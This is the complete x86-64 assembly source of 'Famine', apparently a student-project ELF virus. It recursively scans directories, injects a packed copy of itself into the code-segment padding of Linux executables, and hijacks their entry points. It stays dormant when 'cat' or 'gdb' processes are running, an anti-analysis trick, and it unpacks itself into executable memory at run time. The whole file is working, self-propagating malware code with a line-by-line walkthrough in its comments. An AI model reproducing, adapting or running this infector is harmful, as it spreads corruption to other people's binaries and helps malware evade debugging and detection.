%include "famine.inc"

section.text:
	global _start

; Optimization Techniques:
; - Saving Bytes:
;	mov x, 1 => 5 bytes
; Alternate (smaller):
;	push 1
;	pop x     => 3 bytes
;
; Similarly:
;	xor x, x  => 3 bytes (sets x to 0 without using a register)

; Function calling convention:
; In this case, function parameters are passed in the following order for syscalls: 
; rdi, rsi, rdx, rcx, r8, r9

; Define parameters for infected binaries
_params:
	length dq 0x0       ; Length of the packed virus
	entry_inject dq 0x0  ; Entry point of the virus in the file
	entry_prg dq 0x0     ; Entry point of the original program

; Main entry point
_start:
	call _inject         ; Call _inject function and push return address to the stack

; Signature of the virus
signature db `Famine version 1.0 (c)oded by rstride`, 0x0 ; Virus signature

_inject:
	pop r8               ; Retrieve the return address from the stack (entry of virus)
	sub r8, 0x5          ; Adjust r8 to get the actual entry of the virus (compensate for call)

	; Check if the virus is already injected (based on the entry_inject value)
	xor rax, rax         ; Set rax = 0
	cmp rax, [rel entry_inject] ; Compare entry_inject with 0 to check if in host or infected
	jne .infected        ; If entry_inject is not 0, we are in an infected state

	; Host (non-infected) binary execution flow
	mov rax, SYSCALL_FORK ; Fork the process
	syscall               ; Perform syscall
	cmp rax, 0x0          ; Check if we are in the child process (return value = 0)
	jnz _exit             ; If not child, exit (parent process)

	; Host part continues here
	call _search_dir      ; Search for binaries to infect
	jmp _exit             ; Exit after searching

    .infected:
        ; If already infected, create a child process (fork)
        mov rax, SYSCALL_FORK
        syscall
        cmp rax, 0x0          ; Check if in child process
        jz .virus             ; If in child, execute the virus

        ; If in parent process, continue executing original program
        jmp .prg

        .virus:
            ; Virus execution flow
            push rdx              ; Save rdx (preserving registers)
            push r8               ; Save r8 (address of virus entry)

            ; Memory-mapping the virus to execute in child process
            xor rdi, rdi          ; Set rdi = NULL (map start)
            lea rsi, [rel _eof]   ; rsi = end of file
            lea r8, [rel _params] ; r8 = parameters
            sub rsi, r8           ; Calculate virus size (end - start)
            push 7                ; Set memory protection to PROT_READ | PROT_WRITE | PROT_EXEC
            pop rdx
            push 34               ; Flags MAP_PRIVATE | MAP_ANON
            pop r10
            push -1               ; Set file descriptor to -1 (anonymous mapping)
            pop r8
            xor r9, r9            ; Set offset = 0
            push SYSCALL_MMAP     ; Prepare mmap syscall number
            pop rax
            syscall               ; Map memory for the virus

            push rsi              ; Save the virus length

            ; Copy the virus into memory
            push rax              ; Save the mmap'd memory address
            pop rdi               ; rdi = destination (memory mapped area)
            lea rsi, [rel _params] ; rsi = source (packed virus)
            lea rdx, [rel _pack_start] ; rdx = size of the packed virus
            sub rdx, rsi
            call _ft_memcpy       ; Copy the virus to mmap'd memory

            mov r9, rdi           ; Save the destination address (r9 = mmap address)

            ; Unpack the virus into memory
            add rdi, rdx          ; Update destination pointer (skip packed section)
            add rsi, rdx          ; Update source pointer
            mov rax, [rel length] ; rax = virus length
            sub rax, rdx          ; Adjust length (total - packed part)
            push rax
            pop rdx               ; Set size to unpack
            call _unpack          ; Unpack virus

            ; After unpacking, execute the virus
            push r9               ; Push the mmap'd address back to rdi
            pop rdi
            pop rsi               ; Restore rsi

            pop r8                ; Restore original registers

            push rsi              ; Save virus length again

            lea rsi, [rel _params] ; Set rsi to parameters
            lea rax, [rel _search_dir] ; rax = address of search_dir function
            sub rax, rsi          ; Adjust function pointer relative to parameters
            add rax, rdi          ; Jump to mmap'd memory (search_dir function in memory)

            push rdi              ; Save current memory address

            call rax              ; Jump to mmap'd memory and start execution

            pop rdi               ; Restore rdi (saved memory address)
            pop rsi               ; Restore virus length

            ; Unmap the previous executable memory
            push SYSCALL_MUNMAP
            pop rax
            syscall
            pop rdx

            call _exit            ; Exit the virus

        .prg:
                ; Continue executing original program
            push r8               ; Retrieve saved virus entry
            pop rax

            sub rax, [rel entry_inject] ; Calculate offset from virus entry
            add rax, [rel entry_prg]    ; Adjust to get the entry point of original program

            jmp rax               ; Jump to the original program entry point

_exit:
	; Clean exit syscall
	push SYSCALL_EXIT
	pop rax               ; Exit syscall number
	xor rdi, rdi          ; Exit status = 0
	syscall               ; Perform exit

; Function: _unpack
; Purpose: Decompress data from src (rsi) into dst (rdi) using a special compression scheme.
;          This function assumes that the compressed data uses a magic character to signal
;          repeated sequences.
; Arguments: 
;    - rdi: Destination (unpacked memory location)
;    - rsi: Source (compressed memory location)
;    - rdx: Size of the compressed data

_unpack:
    push r8               ; Preserve registers
    push r9
    push r10
    push r11
    push rcx

    ; Move arguments into other registers for easier access later
    push rdi
    pop r9                ; r9 = destination pointer (unpacked data)
    push rsi
    pop r10               ; r10 = source pointer (compressed data)
    push rdx
    pop r11               ; r11 = size of compressed data

    xor rax, rax          ; Clear rax (used for temporary storage)
    xor rcx, rcx          ; rcx = loop counter (i)
    xor r8, r8            ; r8 = write index (destination pointer offset)
    
.loop_uncompress:          ; Start of the decompression loop
    cmp rcx, r11          ; Check if we have processed all bytes (i >= size)
    jge .end_loop         ; If yes, exit the loop

    ; Check if the current byte matches the magic character (indicating a compressed sequence)
    cmp byte[r10 + rcx], MAGIC_CHAR
    je .uncompress_char   ; If magic character is found, handle the compressed sequence

    ; Otherwise, it's a regular byte. Copy it to the destination
    mov al, [r10 + rcx]   ; Move the current byte from source to al
    mov [r9 + r8], al     ; Store the byte in the destination buffer
    inc rcx               ; Move to the next byte in the source
    inc r8                ; Increment the destination pointer
    jmp .loop_uncompress  ; Continue the loop

.uncompress_char:          ; Handle a compressed sequence
    mov rdi, r9           ; Set rdi to the current destination pointer
    add rdi, r8           ; Offset by r8 (current write index)
    
    ; Get the offset for the sequence
    mov al, [r10 + rcx + 1] ; Load the offset value from the compressed data
    mov rsi, rdi          ; Set rsi to the current destination pointer
    sub rsi, rax          ; Calculate the source of the repeated sequence (rdi - offset)

    ; Get the length of the repeated sequence
    mov al, [r10 + rcx + 2] ; Load the length value from the compressed data
    mov rdx, rax          ; Set rdx = length of the repeated sequence
    
    ; Copy the sequence from the source to the destination
    call _ft_memcpy       ; Copy the sequence using _ft_memcpy

    xor rax, rax          ; Clear rax
    mov al, byte[r10 + rcx + 2] ; Set rax = length of the sequence
    add r8, rax           ; Advance the destination pointer by the length of the sequence
    add rcx, 3            ; Move past the compressed sequence (magic char + offset + length)
    jmp .loop_uncompress  ; Continue decompression

.end_loop:                 ; End of the loop
    ; Restore registers and return
    push r9
    pop rdi
    push r10
    pop rsi
    push r11
    pop rdx

    pop rcx
    pop r11
    pop r10
    pop r9
    pop r8
ret

; Function: _ft_memcpy
; Purpose: Copy data from src (rsi) to dst (rdi) for a given size (rdx).
; Arguments:
;    - rdi: Destination pointer
;    - rsi: Source pointer
;    - rdx: Size of the data to copy
_ft_memcpy:
    push rcx              ; Preserve rcx (loop counter)

    xor rax, rax          ; Clear rax (used for byte copying)
    xor rcx, rcx          ; rcx = loop counter

.loop_byte:                ; Start of the memory copy loop
    cmp rcx, rdx          ; Check if we've copied all bytes
    je .return            ; If yes, exit the loop

    ; Copy byte from source to destination
    mov al, [rsi + rcx]   ; Load the byte from the source (rsi + i)
    mov [rdi + rcx], al   ; Store the byte at the destination (rdi + i)
    inc rcx               ; Increment the counter
    jmp .loop_byte        ; Continue the loop

.return:                   ; End of memory copy
    mov rax, rdi          ; Set return value (destination pointer)

    pop rcx               ; Restore rcx
ret

; Start of the packer logic
; _pack_start marks the beginning of the virus packing section
_pack_start:
; Function: _search_dir
; Purpose: Search directories for files to infect. This involves traversing through 
;          a set of predefined directories and applying the infection logic.
_search_dir:
    ; Check if the process directory is currently being handled
    push 1
    pop rsi              ; rsi = mode for _move_through_dir (set to 1)
    lea rdi, [rel process_dir] ; Load the address of the process directory

    call _move_through_dir ; Traverse the process directory

    ; If no process is found, continue searching other directories
    cmp rax, 0x0
    jne .return          ; If a process was found, return

    xor rsi, rsi         ; rsi = mode for _move_through_dir (set to 0 for general search)
    lea rdi, [rel directories] ; Load the address of the directories array
    xor rcx, rcx         ; Clear the loop counter (rcx = 0)

    .loop_array_string:        ; Loop through directories to search for files
        add rdi, rcx         ; Move to the next directory in the array
        call _ft_strlen      ; Get the length of the current directory string
        push rax             ; Store the length
        pop rcx              ; Set rcx = length (for next iteration)
        call _move_through_dir ; Traverse the current directory
    inc rcx              ; Increment the directory index
    cmp byte[rdi + rcx], 0x0 ; Check if the end of the array is reached
    jnz .loop_array_string ; If not, continue to the next directory

.return:
ret

; Function: _move_through_dir
; Purpose: Traverse a directory to either check for running processes or infect files and subdirectories.
; Arguments: 
;    - rdi: Directory path (string)
;    - rsi: Mode (1 = check process, 0 = infect files)

_move_through_dir:
    ; Save necessary registers
    push r10
    push r12
    push r13
    push rbx
    push rcx
    push rdx

    ; Save the mode (rsi) into r13
    push rsi
    pop r13

    ; Open the directory specified in rdi
    push SYSCALL_OPEN
    pop rax              ; Prepare syscall number for open
    push 0o0200000       ; O_RDONLY | O_DIRECTORY (open directory in read-only mode)
    pop rsi
    syscall
    cmp rax, 0x0         ; Check if directory opened successfully
    jl .return           ; If opening failed, jump to return

    ; Save the directory path into r10 for later use
    push rdi
    pop r10              ; r10 = directory path

    sub rsp, 1024        ; Allocate space for the buffer on the stack

    ; Directory traversal starts here
    push rax             ; Save the file descriptor
    .getdents:
        pop rdi              ; Load the file descriptor
        push SYSCALL_GETDENTS
        pop rax              ; Prepare syscall number for getdents
        push 1024
        pop rdx              ; Set buffer size (1024 bytes)
        mov rsi, rsp         ; Set buffer location on the stack
        syscall              ; Call getdents to read directory entries
        push rdi             ; Save the file descriptor
        push rsi             ; Save the buffer pointer
        pop r12              ; r12 = buffer pointer
        cmp rax, 0x0         ; Check if there are any entries
        jle .close           ; If no entries, close the directory

        push rax
        pop rdx              ; rdx = number of bytes read
        xor rcx, rcx         ; Clear loop counter

    .loop_in_file:
        ; Iterate over directory entries
        cmp rcx, rdx         ; Check if we've processed all entries
        jge .getdents        ; If so, read more directory entries

        ; Process each entry
        mov rdi, r12
        add rdi, rcx         ; Move to the current directory entry
        add rdi, 18          ; Skip to d_name (18 bytes offset in struct dirent)

        ; Skip '.' and '..' directories
        push rcx
        lea rsi, [rel dotdir]  ; Load '.' and '..' strings for comparison
        xor rcx, rcx           ; Clear comparison counter
        .loop_array_string:
            add rsi, rcx          ; Move through the dotdir strings
            call _ft_strcmp       ; Compare the current entry with '.'
            cmp rax, 0x0          ; If match, skip this entry
            je .next_file
            xor rcx, rcx          ; Reset comparison counter

            .next_string:
                ; Move to the next directory entry if needed
                inc rcx
                cmp byte[rsi + rcx], 0x0
                jnz .next_string
        inc rcx
        cmp byte[rsi + rcx], 0x0
        jnz .loop_array_string

    ; Concatenate the current directory entry to the directory path
            push rbx
            sub rsp, 4096         ; Allocate buffer for the concatenated path

            push rdi
            pop rbx
            mov rdi, rsp          ; Set destination buffer
            mov rsi, r10          ; r10 = current directory path
            call _ft_strcpy       ; Copy directory path to the buffer
            push rbx
            pop rsi               ; rsi = current file/directory entry name
            call _ft_concat_path  ; Concatenate the file name to the path

    ; Check if the current entry is a directory or a file
            sub rsp, 600          ; Allocate space for struct stat

            push SYSCALL_LSTAT
            pop rax               ; Prepare syscall for lstat
            mov rsi, rsp          ; rsi = pointer to struct stat
            syscall
            cmp rax, 0x0          ; Check if lstat was successful
            jne .free_buffers     ; If not, free buffers and skip this entry

            mov rax, [rsi + ST_MODE] ; Load the file mode (type and permissions)
            and rax, S_IFMT       ; Mask out file type bits

            ; Check if we are in 'infect' mode (r13 == 0)
            cmp r13, 0
            je .infect            ; If so, jump to the infect logic

            ; Check if the current entry is a directory
            cmp rax, S_IFDIR
            jne .free_buffers     ; If not a directory, skip

            ; If we're looking for a process, check if it's a numeric directory (likely process ID)
            push rdi
            push rbx
            pop rdi
            call _ft_isnum        ; Check if the directory name is a number
            pop rdi
            cmp rax, 0x0          ; If not numeric, skip this entry
            je .free_buffers

            ; Check if there's a status file in the /proc/[pid] directory
            lea rsi, [rel process_status] ; Load "status" filename
            call _ft_concat_path  ; Concatenate to the /proc/[pid] path
            call _check_file_process ; Check if the process is valid
            cmp rax, 0x0          ; If valid, process is found
            jne .process_found

            ; Skip to free buffers if the process wasn't found
            jmp .free_buffers

            .infect:
                    ; If we are in infect mode
                cmp rax, S_IFREG      ; Check if the current entry is a regular file
                je .infect_file       ; If so, infect the file
                cmp rax, S_IFDIR      ; Check if it's a directory
                jne .free_buffers     ; If neither, skip

            ; Infect directory (recursively call _move_through_dir)
            xor rsi, rsi          ; Set mode to 'infect'
            call _move_through_dir ; Recursively infect subdirectory
            jmp .free_buffers     ; After infection, free buffers

        .infect_file:
            ; Infect the file
            call _infect_file     ; Call the file infection routine

        .free_buffers:
            ; Free the allocated buffers
            add rsp, 4696         ; Free 4696 bytes of stack
            pop rbx               ; Restore rbx

        .next_file:
            ; Move to the next file in the directory
            pop rcx               ; Restore rcx
            mov rsi, r12          ; rsi = buffer pointer
            add rsi, rcx          ; Move to the next entry
            push rdi
            movzx edi, word [rsi + D_RECLEN] ; Get the size of the current directory entry
            add rcx, rdi          ; Increment rcx to point to the next entry
            pop rdi
            jmp .loop_in_file     ; Continue to the next file

    .process_found:
        ; Process found, clean up
        add rsp, 4696         ; Free buffers
        pop rbx               ; Restore registers
        pop rcx

    .close:
        ; Close the directory
        push rax
        pop rsi
        pop rdi               ; rdi = file descriptor
        push SYSCALL_CLOSE
        pop rax               ; Prepare syscall for close
        syscall               ; Close the directory

        push r10
        pop rdi               ; Restore directory path
        add rsp, 1024         ; Free the buffer
        push rsi
        pop rax

    .return:
    ; Restore all registers and return
    pop rdx
    pop rcx
    pop rbx
    pop r13
    pop r12
    pop r10
ret

_infect_file: ; (string rdi, stat rsi)
    ; Save necessary registers
    push r10
    push r11
    push r12
    push r13
    push rbx
    push rcx
    push rdx

    push rsi
    pop r12            ; Save the pointer to the stat structure

    ; Open the file in read/write mode
    push SYSCALL_OPEN
    pop rax            ; Prepare syscall number for open
    push 0o0000002     ; O_RDWR (open for reading and writing)
    pop rsi
    syscall
    cmp rax, 0x0
    jl .return         ; If opening fails, return
    push rdi
    pop r10            ; Save file path into r10

    push r8
    push rax           ; Save the file descriptor
    pop r8

    ; Map the file into memory using mmap
    push r10
    xor rdi, rdi       ; Set start address to 0 (let the system decide)
    mov rsi, [r12 + ST_SIZE] ; Get the file size from the stat structure
    push 3
    pop rdx            ; Set memory protection to PROT_READ | PROT_WRITE
    push 2
    pop r10            ; Set flags to MAP_PRIVATE
    xor r9, r9         ; Offset = 0
    push SYSCALL_MMAP
    pop rax
    syscall
    pop r10
    push r8            ; Restore the file descriptor into r8
    pop r11
    pop r8
    cmp rax, 0x0
    jl .close          ; If mmap fails, close the file and return

    push rax           ; Save the mmap address
    pop rsi

    ; Compare the first 5 bytes of the file to the ELF magic number
    lea rdi, [rel elf_magic]
    push 5
    pop rdx
    call _ft_memcmp    ; Compare magic number
    push rsi
    pop r13            ; Save mmap address in r13
    cmp rax, 0x0
    jne .unmap         ; If the file is not an ELF file, unmap and exit

    ; Check if the file is executable or dynamic
    cmp byte[rsi + E_TYPE], ET_EXEC
    je .is_elf_file
    cmp byte[rsi + E_TYPE], ET_DYN
    jne .unmap

    .is_elf_file:
        ; Handle 32-bit version (TODO)
        ; Locate the PT_LOAD segment with executable permissions
        mov ax, [r13 + E_PHNUM] ; Number of program headers
        mov rbx, r13
        add rbx, [r13 + E_PHOFF] ; Program header offset
        xor rcx, rcx
        .find_segment_exec:
            inc rcx
            cmp rcx, rax        ; Check if we have iterated through all program headers
            je .unmap           ; If no suitable segment is found, unmap and return
            cmp dword[rbx], PT_LOAD ; Check if the current header is a PT_LOAD
            jne .next           ; If not, check the next header
            mov dx, [rbx + P_FLAGS]
            and dx, PF_X        ; Check if the segment has execute permission
            jnz .check_if_infected
        .next:
                add rbx, SIZEOF(ELF64_PHDR) ; Move to the next program header
            jmp .find_segment_exec

        .check_if_infected:
            ; Check if the signature of the virus is already present in the segment
            lea rdi, [rel signature]
            call _ft_strlen      ; Get length of the signature
            push rax
            pop rcx              ; Store signature length in rcx
            push rdi
            pop rdx
            mov rdi, [rbx + P_OFFSET] ; Offset of the segment
            add rdi, r13         ; Adjust to point into the mmap'd region
            mov rsi, [rbx + P_FILESZ] ; Size of the segment
            cmp rsi, rcx         ; Ensure the segment is large enough for the signature
            jl .unmap
            call _ft_memmem      ; Search for the signature
            cmp rax, 0x0
            jne .unmap           ; If signature is found, unmap and exit

            ; Check if there is enough space to inject the virus
            sub rdi, r13         ; Calculate the current position in the file
            mov rdi, [rbx + P_OFFSET]
            add rdi, rsi         ; Move to the end of the PT_LOAD segment
            mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; Offset of the next segment
            sub rsi, rdi         ; Calculate the space between the current and next segment

            ; Ensure there is enough space for the virus
            add rdi, 8 * 3       ; Make room for parameters
            lea r9, [rel _params]
            lea rax, [rel _eof]
            sub rax, r9          ; Calculate the virus size
            mov r9, [r12 + ST_SIZE] ; Get the file size
            sub r9, rdi          ; Check available space
            cmp r9, rax
            jl .unmap            ; If not enough space, unmap and return

            ; If enough space, prepare to infect the file
            add rdi, r13         ; Set rdi to the correct location in the mmap'd region
            xor r9, r9
            cmp r9, [rel entry_inject]
            jne .infected        ; If already infected, skip to infected handling

            ; Host: Inject the virus
            push rsi
            mov rax, rdi         ; Save the address for later

            ; Copy the start of the virus into the file
            lea rsi, [rel _start]
            lea rdx, [rel _pack_start]
            sub rdx, rsi         ; Calculate the size of the virus
            call _ft_memcpy      ; Copy the virus to the mmap'd file

            ; Pack part of the virus
            add rdi, rdx
            call _pack
            push rax
            pop r9               ; Save the size of the packed virus

            ; Adjust file sizes and parameters
            add rdx, r9
            pop rdi              ; Restore mmap address
            mov rax, rdi
            pop rsi
            add rdx, 8 * 3       ; Adjust for parameters
            cmp rsi, rdx
            jl .unmap            ; If there isn't enough space, unmap and return

            jmp .params

        .infected:
            ; If already infected, copy the virus into the file
            mov rdx, [rel length]
            cmp rsi, rdx
            jl .unmap            ; If there isn't enough space, unmap and return
            sub rdx, 8 * 3       ; Adjust for parameters
            add rdi, 8 * 3       ; Move past parameters
            mov rsi, r8          ; Set rsi to the virus
            call _ft_memcpy      ; Copy the virus into the file

        .params:
            ; Add parameters (_params) to the file
            sub rax, 8 * 3
            mov [rax], rdx       ; Save virus length
            add rax, 8
            sub rdi, r13
            mov rsi, rdi
            add rsi, [rbx + P_VADDR] ; Adjust for virtual address
            sub rsi, [rbx + P_OFFSET] ; Adjust for file offset
            mov [rax], rsi       ; Save entry point for the virus
            add rax, 8
            mov rsi, [r13 + E_ENTRY] ; Save original entry point
            mov [rax], rsi

            ; Change the file's entry point to point to the injected virus
            add rdi, [rbx + P_VADDR]
            sub rdi, [rbx + P_OFFSET]
            mov [r13 + E_ENTRY], rdi ; Update entry point in ELF header

            ; Adjust the sizes of the PT_LOAD segment
            add [rbx + P_FILESZ], rdx ; Increase file size by the size of the virus
            add [rbx + P_MEMSZ], rdx  ; Increase memory size by the size of the virus

            ; Write the modified file back to disk
            mov rdi, r11         ; Set rdi to the file descriptor
            push r11
            mov rsi, r13         ; Set rsi to the mmap'd address
            mov rdx, [r12 + ST_SIZE] ; Set rdx to the original file size
            push SYSCALL_WRITE
            pop rax
            syscall
            pop r11

    .unmap:
        ; Unmap the file from memory
        push r11
        push r13
        pop rdi
        mov rsi, [r12 + ST_SIZE] ; Size of the mmap'd region
        push SYSCALL_MUNMAP
        pop rax
        syscall
        pop r11

    .close:
        ; Close the file
        push r11
        pop rdi
        push SYSCALL_CLOSE
        pop rax
        syscall

    .return:
        ; Restore registers and return
        push r10
        pop rdi
        push r12
        pop rsi

    pop rdx
    pop rcx
    pop rbx
    pop r13
    pop r12
    pop r11
    pop r10
ret

_check_file_process: ; (string rdi)
    ; Save necessary registers
    push r8
    push rcx
    push rdx
    push rsi

    sub rsp, 0x800      ; Allocate buffer on the stack

    xor rsi, rsi        ; O_RDONLY (read-only)
    push SYSCALL_OPEN
    pop rax             ; Prepare syscall number for open
    syscall
    push rdi
    pop r8              ; Save the path
    push rax
    pop r9              ; Save file descriptor
    xor rax, rax        ; Prepare for read syscall
    cmp r9, 0x0
    jl .return          ; If open fails, return

    mov rdi, r9
    mov rsi, rsp        ; Buffer pointer
    push 0x800
    pop rdx             ; Buffer size
    syscall             ; Read from file

    cmp rax, 0x0
    je .close           ; If no data is read, close and return

        push rax
        pop rsi             ; Store the number of bytes read

        ; Search for specific strings in the file contents
        lea rdi, [rel process]
        xor rcx, rcx        ; Loop counter
        .loop_array_string:
            add rdi, rcx
            call _ft_strlen     ; Get length of the current string
            cmp rsi, rax        ; Check if file contains enough bytes for the search
            jl .close
            push rax
            pop rcx
            push rdi
            pop rdx
            mov rdi, rsp        ; Buffer pointer
            call _ft_memmem     ; Search for the string in the file
            cmp rax, 0x0
            jne .close          ; If found, close and return
            push rdx
            pop rdi

        ; Move to the next string in the process array
        inc rcx
        cmp byte[rdi + rcx], 0x0
        jnz .loop_array_string

    xor rax, rax
    .close:
        ; Close the file
        push rax
        pop rsi
        push r9
        pop rdi
        push SYSCALL_CLOSE
        pop rax
        syscall

    .return:
        ; Restore registers and return
        push r8
        pop rdi
    add rsp, 0x800      ; Free allocated buffer
    pop rsi
    pop rdx
    pop rcx
    pop r8
ret

; -------------------------------- UTILS ---------------------------------------

_ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
    push rdx

    mov rdx, rdi          ; Store original destination
    call _ft_strlen        ; Get the length of the destination string
    add rdi, rax           ; Move rdi to the end of the destination string
    mov byte[rdi], '/'     ; Insert the directory separator '/'
    inc rdi                ; Move pointer to the next position
    call _ft_strcpy        ; Copy source string to destination
    push rdx
    pop rdi                ; Restore rdi (original destination pointer)
    mov rax, rdi           ; Return the new destination pointer

    pop rdx
ret

_ft_isnum: ; (string rdi) ; returns 0 if not numeric, otherwise rax contains the number of digits
    xor rax, rax          ; Clear rax (will count valid characters)
.loop_char:
    cmp byte[rdi + rax], 0x0 ; Check for null terminator (end of string)
    je .return            ; If end of string, return
    cmp byte[rdi + rax], '0' ; Check if character is less than '0'
    jl .isnotnum          ; If true, it's not a number
    cmp byte[rdi + rax], '9' ; Check if character is greater than '9'
    jg .isnotnum          ; If true, it's not a number
    inc rax               ; Increment counter for valid character
    jmp .loop_char        ; Continue to next character
.isnotnum:
    xor rax, rax          ; If not a number, clear rax
.return:
ret

_ft_strlen: ; (string rdi) ; returns the length of the string in rax
    xor rax, rax          ; Set rax to 0 (counter)
.loop_char:
    cmp byte [rdi + rax], 0 ; Compare current character to null terminator
    jz .return            ; If null terminator found, return length
    inc rax               ; Increment rax (character counter)
    jmp .loop_char        ; Continue to next character
.return:
ret

_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx) ; compares two memory blocks
    push rcx
    dec rdx               ; Adjust size (last byte is rdx-1)
    xor rax, rax          ; Clear rax
    xor rcx, rcx          ; Initialize loop counter
.loop_byte:
    mov al, [rdi + rcx]   ; Load byte from first memory block
    cmp al, [rsi + rcx]   ; Compare with byte from second memory block
    jne .return           ; If bytes differ, return
    cmp rcx, rdx          ; Check if we've reached the end of the memory block
    je .return            ; If so, return (no difference found)
    inc rcx               ; Increment loop counter
    jmp .loop_byte        ; Repeat
.return:
    sub al, [rsi + rcx]   ; Return difference of the last compared byte
    inc rdx
    pop rcx
ret

_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx) ; finds needle in haystack
    push r8
    push r9
    push rbx

    xor rax, rax          ; Clear rax
    xor r8, r8            ; Clear r8 (search position)
    sub rsi, rcx          ; Adjust haystack size to prevent out-of-bounds search
    cmp rsi, 0x0
    jl .return            ; If haystack size < needle size, return
    cmp rcx, 0x0
    je .return            ; If needle size = 0, return
.loop_byte:
    xor rax, rax
    cmp r8, rsi           ; Check if end of haystack is reached
    je .return            ; If yes, return (needle not found)
    mov rbx, rdi          ; Save haystack pointer
    add rdi, r8           ; Set rdi to current search position
    push rsi
    pop r9                ; Save haystack size
    push rdx
    pop rsi               ; Set rsi to needle pointer
    push rcx
    pop rdx               ; Set rdx to needle size
    call _ft_memcmp       ; Compare needle with current position in haystack
    push rdx
    pop rcx
    push rsi
    pop rdx
    push r9
    pop rsi
    push rbx
    pop rdi               ; Restore haystack pointer
    cmp rax, 0x0
    je .found             ; If found, jump to found
    inc r8                ; Increment search position
    jmp .loop_byte
.found:
    mov rax, rdi          ; Return pointer to found position
    add rax, r8
.return:
    add rsi, rcx
    pop rbx
    pop r9
    pop r8
ret

_ft_strcmp: ; (string rdi, string rsi)
    push rdx

    call _ft_strlen        ; Get the length of the first string
    push rax
    pop rdx                ; Save the length of the first string
    push rdi
    push rsi
    pop rdi
    call _ft_strlen        ; Get the length of the second string
    push rdi
    pop rsi
    pop rdi
    cmp rax, rdx           ; Compare lengths
    je .continue           ; If lengths match, continue
    inc rdx                ; If not, increment rdx to force mismatch in _ft_memcmp
.continue:
    call _ft_memcmp        ; Compare strings byte by byte

    pop rdx
ret

_ft_strcpy: ; (string rdi, string rsi)
    push rdx

    push rdi
    pop rdx
    push rsi
    pop rdi
    call _ft_strlen        ; Get the length of the source string
    push rdi
    pop rsi
    push rdx
    pop rdi
    push rax
    pop rdx
    inc rdx                ; Include null terminator in the copy
    call _ft_memcpy        ; Perform the memory copy

    pop rdx
ret

; ---------------------------- STATIC PARAMS -----------------------------------

; ELF Magic numbers for 64-bit ELF files
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0

; Directories for scanning
directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
dotdir db `.`, 0x0, `..`, 0x0, 0x0

; Process directories and files
process_dir db `/proc`, 0x0
process_status db `status`, 0x0
process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
_eof:

; ------------------------------- HOST ---------------------------------------

_pack: ;(void *rdi) -> ret size + fill rdi
    push r8
    push r10
    push r11
    push r12
    push rbx
    push rcx
    push rdx
    push rsi

    lea rdx, [rel _eof]      ; Load the end of the virus data
    lea r10, [rel _pack_start] ; Load the start of the virus data
    mov r11, r10             ; Set buffer start to the virus start
    sub rdx, r10             ; Calculate size of the virus

    xor rcx, rcx             ; Initialize `i` (iterator)
    xor r8, r8               ; Initialize `l` (output length)
    .loop_compress:
        cmp rcx, rdx             ; Check if all bytes are processed
        jge .end_compress        ; If so, end compression
        mov rsi, r10
        sub rsi, r11             ; Calculate the length of buffer
        cmp rsi, 255
        jle .continue
        add r11, rsi
        sub r11, 255             ; Adjust the buffer for compression limits
        mov rsi, r10
        sub rsi, r11
        .continue:
        push 1
        pop rbx                  ; Initialize `k`
        xor r12, r12             ; Clear `prev_ret` (previous match)
        .loop_memmem:
            cmp rbx, 255
            jge .end_memmem
            mov rax, rbx
            add rax, rcx
            cmp rax, rdx
            jge .end_memmem
            push rdi
            push rdx
            push rcx
            mov rdi, r11
            mov rdx, r10
            mov rcx, rbx
            call _ft_memmem          ; Search for repeated patterns in the virus data
            pop rcx
            pop rdx
            pop rdi
            cmp rax, 0x0
            je .end_memmem
            push rax
            pop r12                  ; Save match result
            inc rbx                  ; Increase match length
        jmp .loop_memmem
        .end_memmem:
         dec rbx
        cmp r12, 0x0
        je .not_compress_char     ; If no match, copy current byte
        cmp rbx, 4
        jl .not_compress_char
        mov byte[rdi + r8], MAGIC_CHAR
        inc r8
        mov rax, r10
        sub rax, r12
        mov byte[rdi + r8], al
        inc r8
        mov rax, rbx
        mov byte[rdi + r8], al
        inc r8
        jmp .next_loop
        .not_compress_char:
        push 1
        pop rbx
        mov al, [r10]
        mov byte[rdi + r8], al
        inc r8
    .next_loop:
        add r10, rbx
        add rcx, rbx
        jmp .loop_compress
    .end_compress:
        push r8
        pop rax

    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop r12
    pop r11
    pop r10
    pop r8
ret
